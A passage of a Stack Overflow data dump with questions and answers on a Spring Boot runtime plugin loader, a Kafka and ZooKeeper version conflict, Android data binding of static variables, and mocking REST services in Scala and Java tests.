suit the requirements of the task). The plugin is packaged as a `.jar`\r\n 4. I have a screen in my app called **Install new Plugin** where user can upload the `.jar` file containing the plugin. For example, the user uploads a new plugin called `send-email-plugin-1.0.jar` and defines a new Task Type called ***Send Email***.\r\n 5. Once uploaded, the system loads the jar to its classpath.\r\n 6. Whenever the user creates a new task with type ***Send Email*** and runs it, the implementation of `TaskExecutor` in the `send-email-plugin-1.0.jar` is called.\r\n\r\nI want to meet the requirements below:\r\n\r\n 1. The plugin should be loaded at runtime\r\n 2. It should be unloaded / updated (when there is a new `.jar` file) on demand\r\n 3. I must be able to sandbox it and allow / restrict access to certain resources on the host machine.\r\n 4. The host application does not need to access any `beans` from the plugin - we can treat the plugin as a no-spring piece (for lack of a better term)\r\n\r\nI have gone through articles on **OSGi**, **PF4j** and others, but can&#39;t seem to wrap my head around them - they look complicated for my use case (I&#39;m not sure)\r\n\r\n***What I have tried so far:***\r\n\r\nAs a very basic piece of code, I tried doing something like this (assuming I have the user&#39;s uploaded jar file stored somewhere in the file system). \r\n\r\n    @SuppressWarnings({ &quot;rawtypes&quot;, &quot;resource&quot; })\r\n        // pluginName: name of the plugin (or the JAR file)\r\n        // entryPointClass: full name of the implementation class of TaskExecutor within this plugin. For ex: com.myorg.plugins.EmailTaskExecutorImpl\r\n    \tpublic synchronized TaskExecutor loadAdapter(String pluginName, String entryPointClass) {\r\n    \t\ttry {\r\n    \t\t\tURL jarUrl = getJarAsURL(pluginName);\r\n    \t\t\t\r\n    \t\t\tClassLoader systemClassLoader = TaskExecutor.class.getClassLoader();\r\n    \t\t\tClassLoader customLoader = new URLClassLoader(new URL[] {jarUrl}, systemClassLoader);\r\n    \t\t\tClass pluginEntryPoint = customLoader.loadClass(entryPointClass);\r\n    \t\t\tObject pluginEntryPointObject = pluginEntryPoint.newInstance();\r\n    \t\t\treturn (TaskExecutor) pluginEntryPointObject;\r\n    \t\t} catch (MalformedURLException | ClassNotFoundException | InstantiationException | IllegalAccessException e) {\r\n    \t\t\tlog.error(&quot;Error loading JAR for {}&quot;, pluginName, e);\r\n    \t\t\treturn null;\r\n    \t\t}\r\n    \t}\r\n\r\nIt is able to do load the plugin at runtime and execute the Job. But, obviously it doesn&#39;t do the following:\r\n\r\n - Does not handle updates (what if I want to upgrade the plugin to version 2.0?)\r\n - It is not sandboxed. Has full access to server. How can I prevent that?\r\n - Any thread safety / vulnerabilities that I have to take into account?\r\n\r\nRequest someone to point me in the right direction.\r\n\r\nThanks,\r\nSriram","title":"Spring Boot - Best way to build a plugin architecture that loads and unloads plugins at runtime","body":"<p>I am writing a Spring Boot API application, which has to have a plugin architecture. Following is a typical journey:</p>\n<ol>\n<li>My App can execute a task (taking some input and returning an output)</li>\n<li>I have an interface called <code>TaskExecutor</code> with a few methods (for example: <code>execute(Object... inputArgs)</code>)</li>\n<li>Users of my app write a plugin to handle a specific task (User simply implements the <code>TaskExecutor.execute(Object... args)</code> method to suit the requirements of the task). The plugin is packaged as a <code>.jar</code></li>\n<li>I have a screen in my app called <strong>Install new Plugin</strong> where user can upload the <code>.jar</code> file containing the plugin. For example, the user uploads a new plugin called <code>send-email-plugin-1.0.jar</code> and defines a new Task Type called <em><strong>Send Email</strong></em>.</li>\n<li>Once uploaded, the system loads the jar to its classpath.</li>\n<li>Whenever the user creates a new task with type <em><strong>Send Email</strong></em> and runs it, the implementation of <code>TaskExecutor</code> in the <code>send-email-plugin-1.0.jar</code> is called.</li>\n</ol>\n<p>I want to meet the requirements below:</p>\n<ol>\n<li>The plugin should be loaded at runtime</li>\n<li>It should be unloaded / updated (when there is a new <code>.jar</code> file) on demand</li>\n<li>I must be able to sandbox it and allow / restrict access to certain resources on the host machine.</li>\n<li>The host application does not need to access any <code>beans</code> from the plugin - we can treat the plugin as a no-spring piece (for lack of a better term)</li>\n</ol>\n<p>I have gone through articles on <strong>OSGi</strong>, <strong>PF4j</strong> and others, but can't seem to wrap my head around them - they look complicated for my use case (I'm not sure)</p>\n<p><em><strong>What I have tried so far:</strong></em></p>\n<p>As a very basic piece of code, I tried doing something like this (assuming I have the user's uploaded jar file stored somewhere in the file system).</p>\n<pre><code>@SuppressWarnings({ &quot;rawtypes&quot;, &quot;resource&quot; })\n    // pluginName: name of the plugin (or the JAR file)\n    // entryPointClass: full name of the implementation class of TaskExecutor within this plugin. For ex: com.myorg.plugins.EmailTaskExecutorImpl\n    public synchronized TaskExecutor loadAdapter(String pluginName, String entryPointClass) {\n        try {\n            URL jarUrl = getJarAsURL(pluginName);\n            \n            ClassLoader systemClassLoader = TaskExecutor.class.getClassLoader();\n            ClassLoader customLoader = new URLClassLoader(new URL[] {jarUrl}, systemClassLoader);\n            Class pluginEntryPoint = customLoader.loadClass(entryPointClass);\n            Object pluginEntryPointObject = pluginEntryPoint.newInstance();\n            return (TaskExecutor) pluginEntryPointObject;\n        } catch (MalformedURLException | ClassNotFoundException | InstantiationException | IllegalAccessException e) {\n            log.error(&quot;Error loading JAR for {}&quot;, pluginName, e);\n            return null;\n        }\n    }\n</code></pre>\n<p>It is able to do load the plugin at runtime and execute the Job. But, obviously it doesn't do the following:</p>\n<ul>\n<li>Does not handle updates (what if I want to upgrade the plugin to version 2.0?)</li>\n<li>It is not sandboxed. Has full access to server. How can I prevent that?</li>\n<li>Any thread safety / vulnerabilities that I have to take into account?</li>\n</ul>\n<p>Request someone to point me in the right direction.</p>\n<p>Thanks,\nSriram</p>\n"},{"tags":["java","apache-kafka","apache-zookeeper"],"comments":[{"owner":{"account_id":2985035,"reputation":8984,"user_id":2534090,"accept_rate":34,"display_name":"JavaTechnical"},"score":2,"creation_date":1629986839,"post_id":68938765,"comment_id":121837170,"body_markdown":"Are the zookeeper and kafka versions you are using compatible?","body":"Are the zookeeper and kafka versions you are using compatible?"},{"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"score":0,"creation_date":1629987499,"post_id":68938765,"comment_id":121837473,"body_markdown":"Yes, I downloaded the zip from apache Kafka site https://www.apache.org/dyn/closer.cgi?path=/kafka/2.8.0/kafka_2.13-2.8.0.tgz. Actually, it was worked 2 hours earlier. Now it&#39;s not working","body":"Yes, I downloaded the zip from apache Kafka site <a href=\"https://www.apache.org/dyn/closer.cgi?path=/kafka/2.8.0/kafka_2.13-2.8.0.tgz\" rel=\"nofollow noreferrer\">apache.org/dyn/closer.cgi?path=/kafka/2.8.0/&hellip;</a>. Actually, it was worked 2 hours earlier. Now it&#39;s not working"},{"owner":{"account_id":2985035,"reputation":8984,"user_id":2534090,"accept_rate":34,"display_name":"JavaTechnical"},"score":1,"creation_date":1629987684,"post_id":68938765,"comment_id":121837574,"body_markdown":"Do you have any zookeeper version anywhere in the classpath? Also check, if the zookeeper is in the classpath of the Kafka server.","body":"Do you have any zookeeper version anywhere in the classpath? Also check, if the zookeeper is in the classpath of the Kafka server."},{"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"score":0,"creation_date":1629989485,"post_id":68938765,"comment_id":121838509,"body_markdown":"I&#39;m sorry, Where do I need to check that.","body":"I&#39;m sorry, Where do I need to check that."},{"owner":{"account_id":2985035,"reputation":8984,"user_id":2534090,"accept_rate":34,"display_name":"JavaTechnical"},"score":1,"creation_date":1629989877,"post_id":68938765,"comment_id":121838692,"body_markdown":"The `libs` folder in the kafka dir typically contains all the required libraries that Kafka uses.  I see the zookeeper version for your above url to be 3.5.9 from the name of the jar file in the `lib` folder. Check if you have anything different there (or) you have any other zookeeper jar file there.","body":"The <code>libs</code> folder in the kafka dir typically contains all the required libraries that Kafka uses.  I see the zookeeper version for your above url to be 3.5.9 from the name of the jar file in the <code>lib</code> folder. Check if you have anything different there (or) you have any other zookeeper jar file there."},{"owner":{"account_id":2985035,"reputation":8984,"user_id":2534090,"accept_rate":34,"display_name":"JavaTechnical"},"score":1,"creation_date":1629990086,"post_id":68938765,"comment_id":121838798,"body_markdown":"You can also check the CLASSPATH using `echo $CLASSPATH`. I suppose that your kafka broker logs should also be containing the classpath printed, you may want to check there as well.","body":"You can also check the CLASSPATH using <code>echo $CLASSPATH</code>. I suppose that your kafka broker logs should also be containing the classpath printed, you may want to check there as well."},{"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"score":0,"creation_date":1629990521,"post_id":68938765,"comment_id":121838970,"body_markdown":"Yes, there are two jar files related to zookeeper (zookeeper-3.5.9 and zookeeper-jute-3.5.9)","body":"Yes, there are two jar files related to zookeeper (zookeeper-3.5.9 and zookeeper-jute-3.5.9)"},{"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"score":0,"creation_date":1629990554,"post_id":68938765,"comment_id":121838981,"body_markdown":"In server log, I can see the following **environment:zookeeper.version=3.4.13**","body":"In server log, I can see the following <b>environment:zookeeper.version=3.4.13</b>"},{"owner":{"account_id":2985035,"reputation":8984,"user_id":2534090,"accept_rate":34,"display_name":"JavaTechnical"},"score":1,"creation_date":1629990725,"post_id":68938765,"comment_id":121839046,"body_markdown":"This is not the version for 2.8.0, search for corresponding jar file and possibly replace it with zookeeper-3.5.9.jar","body":"This is not the version for 2.8.0, search for corresponding jar file and possibly replace it with zookeeper-3.5.9.jar"},{"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"score":0,"creation_date":1629990883,"post_id":68938765,"comment_id":121839118,"body_markdown":"In lib folder no zookeeper jar with version 3.4.13 . It was with version 3.5.9 but not sure why it is using 3.4.13","body":"In lib folder no zookeeper jar with version 3.4.13 . It was with version 3.5.9 but not sure why it is using 3.4.13"},{"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"score":0,"creation_date":1629990926,"post_id":68938765,"comment_id":121839138,"body_markdown":"Thanks for your time @JavaTechnical . I&#39;ll replace the jar and will inform you if it is working fine","body":"Thanks for your time @JavaTechnical . I&#39;ll replace the jar and will inform you if it is working fine"},{"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"score":0,"creation_date":1629991242,"post_id":68938765,"comment_id":121839300,"body_markdown":"Even now, it is still the same. In class path I can see 3.5.9 but near environment:zookeeper.version= it was picking up 3.4.13","body":"Even now, it is still the same. In class path I can see 3.5.9 but near environment:zookeeper.version= it was picking up 3.4.13"},{"owner":{"account_id":2671330,"reputation":183376,"user_id":2308683,"accept_rate":90,"display_name":"OneCricketeer"},"score":1,"creation_date":1629992581,"post_id":68938765,"comment_id":121839870,"body_markdown":"Dont use the `.bat` scripts to run Kafka on Windows https://www.confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-2/","body":"Dont use the <code>.bat</code> scripts to run Kafka on Windows <a href=\"https://www.confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-2/\" rel=\"nofollow noreferrer\">confluent.io/blog/set-up-and-run-kafka-on-windows-linux-wsl-&zwnj;&#8203;2</a>"}],"answers":[{"tags":[],"owner":{"account_id":23650214,"reputation":21,"user_id":17679196,"display_name":"richard"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1639572980,"creation_date":1639532964,"answer_id":70357578,"question_id":68938765,"body_markdown":"I meet the same question, It is most likely that there are jar packages of other versions of zookeeper under your classpath. You can check by executing the `bin/kafka-server-start.sh config/server.properties` command and then viewing the log. below is my log, I found the wrong zookeeper version: `/usr/local/hive/lib/zookeeper-3.4.6.jar`\r\n\r\n[my log][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/KDvO3.png","title":"Unable to start kafka server (java.lang.NoSuchMethodError)","body":"<p>I meet the same question, It is most likely that there are jar packages of other versions of zookeeper under your classpath. You can check by executing the <code>bin/kafka-server-start.sh config/server.properties</code> command and then viewing the log. below is my log, I found the wrong zookeeper version: <code>/usr/local/hive/lib/zookeeper-3.4.6.jar</code></p>\n<p><a href=\"https://i.stack.imgur.com/KDvO3.png\" rel=\"nofollow noreferrer\">my log</a></p>\n"}],"owner":{"account_id":15414186,"reputation":155,"user_id":11120152,"display_name":"vigneshwar reddy"},"comment_count":13,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1851,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1639572980,"creation_date":1629981907,"question_id":68938765,"body_markdown":"was trying to start kafka server and was ending up with the following error:-\r\n\r\n    (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:java.io.tmpdir=C:\\Users\\vich0221\\AppData\\Local\\Temp\\1\\ (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:java.compiler=&lt;NA&gt; (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:os.name=Windows 10 (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:os.arch=amd64 (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:os.version=10.0 (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:user.name=vignesh (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:user.home=C:\\Users\\vignesh (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] INFO Client environment:user.dir=C:\\kafka (org.apache.zookeeper.ZooKeeper)\r\n    [2021-08-26 17:20:57,934] ERROR Fatal error during KafkaServer startup. Prepare to shutdown (kafka.server.KafkaServer)\r\n    java.lang.NoSuchMethodError: org.apache.zookeeper.ZooKeeper.&lt;init&gt;(Ljava/lang/String;ILorg/apache/zookeeper/Watcher;Lorg/apache/zookeeper/client/ZKClientConfig;)V\r\n            at kafka.zookeeper.ZooKeeperClient.&lt;init&gt;(ZooKeeperClient.scala:117)\r\n            at kafka.zk.KafkaZkClient$.apply(KafkaZkClient.scala:1948)\r\n            at kafka.server.KafkaServer.createZkClient$1(KafkaServer.scala:431)\r\n            at kafka.server.KafkaServer.initZkClient(KafkaServer.scala:456)\r\n            at kafka.server.KafkaServer.startup(KafkaServer.scala:191)\r\n            at kafka.Kafka$.main(Kafka.scala:109)\r\n            at kafka.Kafka.main(Kafka.scala)\r\n    [2021-08-26 17:20:57,934] INFO shutting down (kafka.server.KafkaServer)\r\n    [2021-08-26 17:20:57,950] INFO App info kafka.server for 0 unregistered (org.apache.kafka.common.utils.AppInfoParser)\r\n    [2021-08-26 17:20:57,950] INFO shut down completed (kafka.server.KafkaServer)\r\n    [2021-08-26 17:20:57,950] ERROR Exiting Kafka. (kafka.Kafka$)\r\n    [2021-08-26 17:20:57,950] INFO shutting down (kafka.server.KafkaServer)\r\n\r\nMy Zookeeper was up and running\r\n\r\n    [2021-08-26 17:20:29,150] INFO binding to port 0.0.0.0/0.0.0.0:2181 (org.apache.zookeeper.server.NIOServerCnxnFactory)\r\n\r\nI&#39;m not sure what is wrong with it. It was working earlier and I didn&#39;t touch any configuration file. I simply started the zookeeper and when trying to start kafka server it was throwing an error. I can see in the error near **java.compiler** it is set to **NA**. But I was able to detect java using `java -version` from cmd. Is this causing that error???? \r\n\r\nHow to overcome this??\r\n","title":"Unable to start kafka server (java.lang.NoSuchMethodError)","body":"<p>was trying to start kafka server and was ending up with the following error:-</p>\n<pre><code>(org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:java.io.tmpdir=C:\\Users\\vich0221\\AppData\\Local\\Temp\\1\\ (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:java.compiler=&lt;NA&gt; (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:os.name=Windows 10 (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:os.arch=amd64 (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:os.version=10.0 (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:user.name=vignesh (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:user.home=C:\\Users\\vignesh (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] INFO Client environment:user.dir=C:\\kafka (org.apache.zookeeper.ZooKeeper)\n[2021-08-26 17:20:57,934] ERROR Fatal error during KafkaServer startup. Prepare to shutdown (kafka.server.KafkaServer)\njava.lang.NoSuchMethodError: org.apache.zookeeper.ZooKeeper.&lt;init&gt;(Ljava/lang/String;ILorg/apache/zookeeper/Watcher;Lorg/apache/zookeeper/client/ZKClientConfig;)V\n        at kafka.zookeeper.ZooKeeperClient.&lt;init&gt;(ZooKeeperClient.scala:117)\n        at kafka.zk.KafkaZkClient$.apply(KafkaZkClient.scala:1948)\n        at kafka.server.KafkaServer.createZkClient$1(KafkaServer.scala:431)\n        at kafka.server.KafkaServer.initZkClient(KafkaServer.scala:456)\n        at kafka.server.KafkaServer.startup(KafkaServer.scala:191)\n        at kafka.Kafka$.main(Kafka.scala:109)\n        at kafka.Kafka.main(Kafka.scala)\n[2021-08-26 17:20:57,934] INFO shutting down (kafka.server.KafkaServer)\n[2021-08-26 17:20:57,950] INFO App info kafka.server for 0 unregistered (org.apache.kafka.common.utils.AppInfoParser)\n[2021-08-26 17:20:57,950] INFO shut down completed (kafka.server.KafkaServer)\n[2021-08-26 17:20:57,950] ERROR Exiting Kafka. (kafka.Kafka$)\n[2021-08-26 17:20:57,950] INFO shutting down (kafka.server.KafkaServer)\n</code></pre>\n<p>My Zookeeper was up and running</p>\n<pre><code>[2021-08-26 17:20:29,150] INFO binding to port 0.0.0.0/0.0.0.0:2181 (org.apache.zookeeper.server.NIOServerCnxnFactory)\n</code></pre>\n<p>I'm not sure what is wrong with it. It was working earlier and I didn't touch any configuration file. I simply started the zookeeper and when trying to start kafka server it was throwing an error. I can see in the error near <strong>java.compiler</strong> it is set to <strong>NA</strong>. But I was able to detect java using <code>java -version</code> from cmd. Is this causing that error????</p>\n<p>How to overcome this??</p>\n"},{"tags":["java","android","android-databinding"],"comments":[{"owner":{"account_id":13981950,"reputation":268,"user_id":10097879,"display_name":"Pratik Bhandari"},"score":1,"creation_date":1639033559,"post_id":70285770,"comment_id":124246103,"body_markdown":"Is it possible for you to share the line of code which resulted in this exception? \nit would help to provide the perfect solution. Thanks!","body":"Is it possible for you to share the line of code which resulted in this exception?  it would help to provide the perfect solution. Thanks!"},{"owner":{"account_id":20145264,"reputation":250,"user_id":14773942,"display_name":"ʀᴀʜɪʟ"},"score":0,"creation_date":1639039298,"post_id":70285770,"comment_id":124247898,"body_markdown":"Is it also possible for you to add the code of that static variable? &amp; Is this a Gradle error?","body":"Is it also possible for you to add the code of that static variable? &amp; Is this a Gradle error?"}],"owner":{"account_id":15814474,"reputation":21,"user_id":11410618,"display_name":"Sanjay Kumar"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":142,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1639572874,"creation_date":1639032849,"question_id":70285770,"body_markdown":"I tried to bind a static variable from my data model to the respective view using data binding. Does data binding allow static variables to bind? If so then how it is done? I even tried to access that static variable using a getter method.\r\n\r\nThe error is as follows \r\n\r\n&gt; cannot generate view binders java.lang.ClassCastException: class\r\n&gt; android.databinding.tool.expr.IdentifierExpr cannot be cast to class\r\n&gt; android.databinding.tool.expr.StaticIdentifierExpr\r\n&gt; (android.databinding.tool.expr.IdentifierExpr and\r\n&gt; android.databinding.tool.expr.StaticIdentifierExpr are in unnamed\r\n&gt; module of loader java.net.URLClassLoader @59fc7e39)","title":"Can a static variable can be used in data binding?","body":"<p>I tried to bind a static variable from my data model to the respective view using data binding. Does data binding allow static variables to bind? If so then how it is done? I even tried to access that static variable using a getter method.</p>\n<p>The error is as follows</p>\n<blockquote>\n<p>cannot generate view binders java.lang.ClassCastException: class\nandroid.databinding.tool.expr.IdentifierExpr cannot be cast to class\nandroid.databinding.tool.expr.StaticIdentifierExpr\n(android.databinding.tool.expr.IdentifierExpr and\nandroid.databinding.tool.expr.StaticIdentifierExpr are in unnamed\nmodule of loader java.net.URLClassLoader @59fc7e39)</p>\n</blockquote>\n"},{"tags":["java","scala","rest","akka","spray"],"answers":[{"tags":[],"owner":{"account_id":50594,"reputation":12311,"user_id":151004,"accept_rate":83,"display_name":"thoredge"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1453195728,"creation_date":1453195728,"answer_id":34872999,"question_id":34872842,"body_markdown":"Mockito is still for me the best mock-utility (see http://site.mockito.org/). It&#39;s written for and in java, but I find it works very well with scala. Another good one is easymock (http://easymock.org/).\r\n\r\nYou should also evaluate whether you need to go so low as mocking HttpResponse or if you can let your tests operate on a higher level than that.","title":"how to write test case for rest service in scala akka(spray)","body":"<p>Mockito is still for me the best mock-utility (see <a href=\"http://site.mockito.org/\" rel=\"nofollow\">http://site.mockito.org/</a>). It's written for and in java, but I find it works very well with scala. Another good one is easymock (<a href=\"http://easymock.org/\" rel=\"nofollow\">http://easymock.org/</a>).</p>\n\n<p>You should also evaluate whether you need to go so low as mocking HttpResponse or if you can let your tests operate on a higher level than that.</p>\n"},{"tags":[],"owner":{"account_id":138883,"reputation":10804,"user_id":344116,"accept_rate":71,"display_name":"Andreas Neumann"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1453209856,"creation_date":1453199613,"answer_id":34874480,"question_id":34872842,"body_markdown":"The best option would be to use *Spray Test Kit*\r\nhttp://spray.io/documentation/1.1.2/spray-testkit/ which comes with predefined methods which allow for some mocking.\r\n\r\nIf you need to mock an underlaying library *Mockito* is a grat choice but there are others like *Scalamock* you could give a try.\r\n\r\nFor JSON checking I had good experience with using spray&#39;s json library and checking on the deserialized object.","title":"how to write test case for rest service in scala akka(spray)","body":"<p>The best option would be to use <em>Spray Test Kit</em>\n<a href=\"http://spray.io/documentation/1.1.2/spray-testkit/\" rel=\"nofollow\">http://spray.io/documentation/1.1.2/spray-testkit/</a> which comes with predefined methods which allow for some mocking.</p>\n\n<p>If you need to mock an underlaying library <em>Mockito</em> is a grat choice but there are others like <em>Scalamock</em> you could give a try.</p>\n\n<p>For JSON checking I had good experience with using spray's json library and checking on the deserialized object.</p>\n"},{"tags":[],"owner":{"account_id":345742,"reputation":122,"user_id":678842,"accept_rate":25,"display_name":"d-n-ust"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639572795,"creation_date":1453209694,"answer_id":34877946,"question_id":34872842,"body_markdown":"I try to answer to the title:\r\n\r\n&gt; how to write test case for rest service in scala akka(spray)\r\n\r\nIt looks like there are missing points in the detailed description of the question...\r\n\r\nIt worth to mention that there are different levels of tests we usually write and I would suggest the following:\r\n\r\n - for unit tests (no actor specific) mocking there many options that not different from usual suspects we have in java ([Mockito][1], [EasyMock][2], [JMock][3]) + some scala specific (like [ScalaMock][4]). [Scalatest][5] provides a sugar wrapper for some of them so I would recommend it. \r\n - on integration tests level I would mention [akka-testkit][6] which is the best option to verify actors behaviour by exchanging messages. Also as mentioned in previous answer there is [spray-testkit][7] which makes testing of route logic easy.\r\n - for service/component level tests (send http request and verify the http response) you can use any usual testing library like Scalatest or use more complicated one for writing business oriented tests like [cucumber][8]. There are also some options to mock/stub dependencies like: [mock-server][9], [wiremock][10], [stubby4j][11] which actually can be used in any language but the question mentions scala so jvm running options should be preferable. From my experience mock-server is the most flexible option here.\r\n\r\n\r\n  [1]: http://site.mockito.org/\r\n  [2]: http://easymock.org/\r\n  [3]: http://www.jmock.org/\r\n  [4]: http://scalamock.org/\r\n  [5]: http://www.scalatest.org/\r\n  [6]: http://doc.akka.io/docs/akka/current/scala/testing.html#Asynchronous_Integration_Testing_with_TestKit\r\n  [7]: http://spray.io/documentation/1.1.2/spray-testkit/\r\n  [8]: https://cucumber.io/\r\n  [9]: http://www.mock-server.com/#what-is-mockserver\r\n  [10]: http://wiremock.org/\r\n  [11]: https://stubby4j.com","title":"how to write test case for rest service in scala akka(spray)","body":"<p>I try to answer to the title:</p>\n<blockquote>\n<p>how to write test case for rest service in scala akka(spray)</p>\n</blockquote>\n<p>It looks like there are missing points in the detailed description of the question...</p>\n<p>It worth to mention that there are different levels of tests we usually write and I would suggest the following:</p>\n<ul>\n<li>for unit tests (no actor specific) mocking there many options that not different from usual suspects we have in java (<a href=\"http://site.mockito.org/\" rel=\"nofollow noreferrer\">Mockito</a>, <a href=\"http://easymock.org/\" rel=\"nofollow noreferrer\">EasyMock</a>, <a href=\"http://www.jmock.org/\" rel=\"nofollow noreferrer\">JMock</a>) + some scala specific (like <a href=\"http://scalamock.org/\" rel=\"nofollow noreferrer\">ScalaMock</a>). <a href=\"http://www.scalatest.org/\" rel=\"nofollow noreferrer\">Scalatest</a> provides a sugar wrapper for some of them so I would recommend it.</li>\n<li>on integration tests level I would mention <a href=\"http://doc.akka.io/docs/akka/current/scala/testing.html#Asynchronous_Integration_Testing_with_TestKit\" rel=\"nofollow noreferrer\">akka-testkit</a> which is the best option to verify actors behaviour by exchanging messages. Also as mentioned in previous answer there is <a href=\"http://spray.io/documentation/1.1.2/spray-testkit/\" rel=\"nofollow noreferrer\">spray-testkit</a> which makes testing of route logic easy.</li>\n<li>for service/component level tests (send http request and verify the http response) you can use any usual testing library like Scalatest or use more complicated one for writing business oriented tests like <a href=\"https://cucumber.io/\" rel=\"nofollow noreferrer\">cucumber</a>. There are also some options to mock/stub dependencies like: <a href=\"http://www.mock-server.com/#what-is-mockserver\" rel=\"nofollow noreferrer\">mock-server</a>, <a href=\"http://wiremock.org/\" rel=\"nofollow noreferrer\">wiremock</a>, <a href=\"https://stubby4j.com\" rel=\"nofollow noreferrer\">stubby4j</a> which actually can be used in any language but the question mentions scala so jvm running options should be preferable. From my experience mock-server is the most flexible option here.</li>\n</ul>\n"}],"owner":{"account_id":4255535,"reputation":2091,"user_id":3481325,"accept_rate":42,"display_name":"Sanjay Rabari"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":504,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":34874480,"answer_count":3,"score":0,"last_activity_date":1639572795,"creation_date":1453195284,"question_id":34872842,"body_markdown":"How to mock HttpRespose? I am using scalla, akka with spray for calling rest service which respond with json, I need to write test case for same. suggest me the technology that can be used.","title":"how to write test case for rest service in scala akka(spray)","body":"<p>How to mock HttpRespose? I am using scalla, akka with spray for calling rest service which respond with json, I need to write test case for same. suggest me the technology that can be used.</p>\n"},{"tags":["java","mocking","integration-testing","stubbing","rest-assured"],"comments":[{"owner":{"account_id":2095246,"reputation":43828,"user_id":1864167,"accept_rate":90,"display_name":"Jeroen Vannevel"},"score":0,"creation_date":1379648161,"post_id":18908375,"comment_id":27913255,"body_markdown":"If you separate the retrieval of data from the manipulating of it and outsource it to an interface with implementation, you can use contructor or setter injection to inject your own testdata.","body":"If you separate the retrieval of data from the manipulating of it and outsource it to an interface with implementation, you can use contructor or setter injection to inject your own testdata."},{"owner":{"account_id":36143,"reputation":740,"user_id":102958,"accept_rate":46,"display_name":"etang"},"score":0,"creation_date":1379694672,"post_id":18908375,"comment_id":27935985,"body_markdown":"@JeroenVannevel can you provide an example?","body":"@JeroenVannevel can you provide an example?"},{"owner":{"account_id":2095246,"reputation":43828,"user_id":1864167,"accept_rate":90,"display_name":"Jeroen Vannevel"},"score":0,"creation_date":1379697313,"post_id":18908375,"comment_id":27937210,"body_markdown":"I have posted an example as an answer.","body":"I have posted an example as an answer."}],"answers":[{"tags":[],"owner":{"account_id":2000616,"reputation":124,"user_id":1791759,"display_name":"vigneshre"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639572732,"creation_date":1379648561,"answer_id":18908464,"question_id":18908375,"body_markdown":"Lets say your code calls endpointB internally via http, you can stub that api by using https://github.com/katta/fakerest or https://stubby4j.com .So when your code makes a call internally to the another api, it will hit these stubs, which will return a dummy response always. Hope this helps.","title":"Mock / stub with integration testing in Java","body":"<p>Lets say your code calls endpointB internally via http, you can stub that api by using <a href=\"https://github.com/katta/fakerest\" rel=\"nofollow noreferrer\">https://github.com/katta/fakerest</a> or <a href=\"https://stubby4j.com\" rel=\"nofollow noreferrer\">https://stubby4j.com</a> .So when your code makes a call internally to the another api, it will hit these stubs, which will return a dummy response always. Hope this helps.</p>\n"},{"tags":[],"owner":{"account_id":2095246,"reputation":43828,"user_id":1864167,"accept_rate":90,"display_name":"Jeroen Vannevel"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1379697298,"creation_date":1379697298,"answer_id":18922323,"question_id":18908375,"body_markdown":"    interface IDataProvider {\r\n     string RetrieveData();\r\n    }\r\n    \r\n    class StandardDataProvider : IDataProvider {\r\n     public string RetrieveData(){\r\n      // call to API\r\n     }\r\n    }\r\n    \r\n    class Program {\r\n     private IDataProvider _dataProvider;\r\n    \r\n     public Program(IDataProvider provider = null) {\r\n      _dataProvider = provider ?? new StandardProvider();\r\n     }\r\n    \r\n     public void MethodToTest(){\r\n      var data = _dataProvider.RetrieveData();\r\n      // do your thing\r\n     }\r\n    }\r\n\r\nIn the tests you can mock the data by creating your own `IDataProvider` object and working with its data.\r\n\r\n    class TestDataProvider : IDataProvider {\r\n     public string RetrieveData(){\r\n      return &quot;my own data&quot;;\r\n     }\r\n    }\r\n    \r\n    class Test {\r\n    